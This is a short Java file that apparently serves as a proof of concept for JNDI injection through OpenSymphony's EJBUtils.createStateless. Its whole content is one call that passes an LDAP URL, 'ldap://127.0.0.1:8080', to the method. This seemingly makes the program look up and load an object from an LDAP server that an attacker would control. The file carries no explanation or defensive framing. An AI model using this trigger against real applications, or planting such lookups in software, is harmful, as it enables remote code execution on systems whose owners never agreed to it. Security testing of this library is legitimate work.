package org.example;

import com.opensymphony.util.EJBUtils;

public class Main {
    public static void main(String[] args) throws Throwable {
        EJBUtils.createStateless("ldap://127.0.0.1:8080");
    }
}